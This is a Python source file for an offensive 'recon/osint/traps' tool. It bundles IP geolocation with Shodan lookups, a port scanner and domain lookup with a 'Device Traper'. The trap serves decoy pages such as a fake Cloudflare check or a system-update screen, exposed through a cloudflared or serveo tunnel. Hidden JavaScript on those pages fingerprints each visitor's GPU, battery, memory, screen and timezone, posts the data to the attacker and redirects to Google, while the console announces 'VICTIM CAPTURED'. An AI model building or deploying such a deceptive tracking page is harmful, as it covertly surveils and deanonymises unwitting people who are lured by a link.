#!/usr/bin/env python3
# Author: Lokesh Kumar
# Date: 2026-02-08
# Youtube: https://youtube.com/@termux2
# Github:  https://github.com/trmxvibs
import sys
import os
import time
import subprocess
import shutil
import socket
import json
import threading
import http.server
import socketserver
import urllib.request
import urllib.error
import re
from datetime import datetime


class InstallManager:
    @staticmethod
    def check():
        required = ['requests', 'shodan', 'folium', 'user_agents']
        missing = []
        for req in required:
            try: __import__(req)
            except ImportError: missing.append(req)
        
        if missing:
            print(f"[*] Installing dependencies: {', '.join(missing)}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("[+] Dependencies installed. Restarting...")
            os.execv(sys.executable, ['python'] + sys.argv)

try:
    InstallManager.check()
    import shodan
    import folium
    import user_agents
except: pass


if os.name == 'nt':
    os.system('color') # Windows

class Colors:
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    WHITE = '\033[97m'
    MAGENTA = '\033[95m'
    GREY = '\033[90m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


class Utils:
    @staticmethod
    def clear(): os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_free_port():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(('', 0))
            return s.getsockname()[1]

    @staticmethod
    def banner():
        Utils.clear()
        print(f"{Colors.RED}{Colors.BOLD}")
        print("       🌀THE CHAKRAVYUH 🌀       ")
        print(" ──────────────────────────────────────────")
        print("  █▀▄▀█ ▄▀█ █▄█ ▄▀█      ░░░ ░░░ ░░░")
        print("  █ ▀ █ █▀█  █  █▀█ v1.0      ")
        print(f"{Colors.MAGENTA} ═══════════════════════════════════════════{Colors.BOLD}")
        print(f"{Colors.YELLOW} LOKESH-KUMAR | traps | recon | osint{Colors.RESET}\n")
        print("Youtube : https://youtube.com/@termux2")
        print("Github :  https://github.com/trmxvibs ")

class ConfigManager:
    FILE = "chakravyuh_config.json"
    @staticmethod
    def load():
        if os.path.exists(ConfigManager.FILE):
            try:
                with open(ConfigManager.FILE, "r") as f: return json.load(f)
            except: return {}
        return {}
    @staticmethod
    def save(key, val):
        d = ConfigManager.load()
        d[key] = val
        with open(ConfigManager.FILE, "w") as f: json.dump(d, f)
        print(f"{Colors.GREEN}[+] Config Saved.{Colors.RESET}")

#  TEMPLATES 
TEMPLATES = {
    '1': ('Standard Loading', """<h1 style="color:white;font-family:sans-serif;text-align:center;margin-top:20%">Loading content...</h1>"""),
    '2': ('Fake Cloudflare', """
        <div style="text-align:center;font-family:sans-serif;margin-top:10%">
        <h1>Checking your browser...</h1>
        <p>Please wait while we verify you are human.</p>
        <div style="loader"></div>
        </div>"""),
    '3': ('System Update', """
        <div style="text-align:center;font-family:sans-serif;color:white;background:#0078d7;height:100%;padding-top:20%">
        <h1>Installing Updates 98%</h1>
        <p>Don't turn off your PC. This will take a while.</p>
        </div>"""),
}

BASE_HTML = """
<!DOCTYPE html><html><body style="background:#111;color:#ccc;margin:0">
{content}
<script>
async function s(){{
    let d={{
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        m:navigator.deviceMemory||'N/A',
        c:navigator.hardwareConcurrency||'N/A',
        w:screen.width,h:screen.height,
        t:navigator.maxTouchPoints,
        b:'N/A',bc:'N/A',g:'N/A',net:'Unknown'
    }};
    try{{let c=navigator.connection;if(c){{d.net=c.effectiveType}}}}catch(e){{}}
    try{{let b=await navigator.getBattery();d.b=Math.round(b.level*100)+'%';d.bc=b.charging?'Yes':'No'}}catch(e){{}}
    try{{let cv=document.createElement('canvas');let gl=cv.getContext('webgl');
    let db=gl.getExtension('WEBGL_debug_renderer_info');d.g=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}catch(e){{}}
    
    fetch('/c',{{method:'POST',body:JSON.stringify(d)}});
    setTimeout(()=>{{window.location.href='https://google.com'}}, 2000);
}}s();
</script></body></html>
"""

class ReconModule:
    def run_ip(self):
        t = input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}").strip()
        if not t: return
        print(f"\n{Colors.CYAN}[*] IP Analysis...{Colors.RESET}")
        try:
            with urllib.request.urlopen(f"http://ip-api.com/json/{t}?fields=66846719") as u:
                d = json.loads(u.read().decode())
            print(f" Geo    : {d.get('city')}, {d.get('country')}")
            print(f" ISP    : {d.get('isp')}")
            print(f" Proxy  : {d.get('proxy')}")
            
            if 'lat' in d:
                m = folium.Map([d['lat'], d['lon']], zoom_start=15)
                folium.Marker([d['lat'], d['lon']], popup=t).add_to(m)
                m.save(f"map_{t}.html")
                print(f" Map    : Saved as map_{t}.html")
        except: print("Error fetching IP data")
        
        cfg = ConfigManager.load()
        if "shodan_api" in cfg:
            try:
                print(f"{Colors.MAGENTA}[*] Shodan Scan...{Colors.RESET}")
                api = shodan.Shodan(cfg["shodan_api"])
                h = api.host(t)
                print(f" OS     : {h.get('os')}")
                print(f" Ports  : {h.get('ports')}")
                print(f" Vulns  : {len(h.get('vulns', []))} detected")
            except: pass
        input("\nEnter to return...")

    def run_port(self):
        t = input(f"{Colors.YELLOW}[?] Target IP: {Colors.RESET}").strip()
        print(f"{Colors.CYAN}[*] Quick Scanning Common Ports...{Colors.RESET}")
        ports = [21,22,23,25,53,80,110,443,445,3306,3389,8080]
        for p in ports:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((t, p)) == 0:
                    print(f" Port {p}: {Colors.GREEN}OPEN{Colors.RESET}")
        input("\nEnter to return...")

    def run_phone(self):
        p = input(f"{Colors.YELLOW}[?] Phone Number (+91..): {Colors.RESET}").strip()
        print(f"{Colors.GREEN}[*] Basic Format Check...{Colors.RESET}")
        if len(p) > 10: print(f" Valid Format: Yes\n Country Code: {p[:3]}")
        print(f"{Colors.GREY}(Add Numverify API in code for full lookup){Colors.RESET}")
        input("\nEnter to return...")

    def run_domain(self):
        d = input(f"{Colors.YELLOW}[?] Domain: {Colors.RESET}").strip()
        try:
            ip = socket.gethostbyname(d)
            print(f" IP Address : {Colors.GREEN}{ip}{Colors.RESET}")
            cfg = ConfigManager.load()
            if "shodan_api" in cfg:
                api = shodan.Shodan(cfg["shodan_api"])
                dns = api.dns.domain_info(d)
                print(f" Subdomains : {dns.get('subdomains')}")
        except: print("Domain not found.")
        input("\nEnter to return...")

# --- TRAP ENGINE ---
class TrapServer(http.server.SimpleHTTPRequestHandler):
    template_code = TEMPLATES['1'][1]

    def log_message(self, f, *a): return
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        html = BASE_HTML.format(content=TrapServer.template_code)
        self.wfile.write(html.encode())

    def do_POST(self):
        l = int(self.headers['Content-Length'])
        d = json.loads(self.rfile.read(l).decode())
        
        ua = user_agents.parse(self.headers.get('User-Agent'))
        
        # GPU Prediction
        gpu = d.get('g', '').lower()
        pred = "Unknown"
        if "mali" in gpu: pred = "Samsung/Realme (Mid-range)"
        elif "adreno" in gpu: pred = "Redmi/OnePlus/Poco (Snapdragon)"
        elif "apple" in gpu: pred = "iPhone/iPad"
        elif "intel" in gpu or "nvidia" in gpu: pred = "PC/Laptop"

        print(f"\n{Colors.RED}[+] VICTIM CAPTURED: {self.client_address[0]} @ {datetime.now().strftime('%H:%M:%S')}{Colors.RESET}")
        print(f"{Colors.CYAN}--- IDENTITY ---{Colors.RESET}")
        print(f" OS      : {Colors.GREEN}{ua.os.family} {ua.os.version_string}{Colors.RESET}")
        print(f" Browser : {ua.browser.family} {ua.browser.version_string}")
        print(f" Loc     : {d.get('tz')}")
        
        print(f"{Colors.CYAN}--- HARDWARE ---{Colors.RESET}")
        print(f" Model   : {Colors.MAGENTA}{pred}{Colors.RESET}")
        print(f" GPU     : {d.get('g')}")
        print(f" CPU     : {d.get('c')} Cores | RAM: {d.get('m')} GB")
        print(f" Screen  : {d.get('w')}x{d.get('h')}")
        print(f" Battery : {d.get('b')} (Charging: {d.get('bc')})")
        print(f" Net     : {d.get('net')}\n")
        
        self.send_response(200); self.end_headers()

class TrapManager:
    def run(self):
        print(f"\n{Colors.CYAN}[?] Select Trap Template:{Colors.RESET}")
        for k, v in TEMPLATES.items(): print(f" [{k}] {v[0]}")
        
        ch = input(f"{Colors.YELLOW} > {Colors.RESET}").strip()
        if ch in TEMPLATES: TrapServer.template_code = TEMPLATES[ch][1]

        port = Utils.get_free_port()
        try:
            httpd = socketserver.TCPServer(("", port), TrapServer)
            threading.Thread(target=httpd.serve_forever, daemon=True).start()
        except: return

        print(f"{Colors.GREEN}[+] Local: http://localhost:{port}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Starting Tunnel...{Colors.RESET}")
        
        if shutil.which("cloudflared"):
            proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            while True:
                line = proc.stderr.readline().decode()
                if "trycloudflare.com" in line:
                    match = re.search(r"(?P<url>https?://[^\s]+trycloudflare\.com)", line)
                    if match: print(f"\n{Colors.GREEN}{Colors.BOLD} >>> LINK: {match.group('url')} <<<{Colors.RESET}\n"); break
        else:
            subprocess.Popen(f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net".split())
            print(f"{Colors.GREY}(Check logs for Serveo link){Colors.RESET}")

        print("Waiting for victims... (Ctrl+C to stop)")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt: pass

def main():
    rm = ReconModule()
    tm = TrapManager()
    
    while True:
        Utils.banner()
        print(f"{Colors.CYAN}[1] IP Tracker {Colors.RESET}")
        print(f"{Colors.CYAN}[2] Port Scanner {Colors.RESET}")
        print(f"{Colors.CYAN}[3] Phone Number Tracker{Colors.RESET}")
        print(f"{Colors.CYAN}[4] Domain Intel (DNS){Colors.RESET}")
        print(f"{Colors.CYAN}[5] Device Traper {Colors.RESET}")
        print(f"{Colors.CYAN}[6] Settings {Colors.RESET}")
        print(f"{Colors.RED}[0] Exit{Colors.RESET}")
        
        c = input(f"\n{Colors.GREEN}chakravyuh > {Colors.RESET}").strip()
        
        if c == '1': rm.run_ip()
        elif c == '2': rm.run_port()
        elif c == '3': rm.run_phone()
        elif c == '4': rm.run_domain()
        elif c == '5': tm.run()
        elif c == '6': 
            k = input("Shodan API Key: "); ConfigManager.save("shodan_api", k)
        elif c == '0': sys.exit()

if __name__ == "__main__":
    main()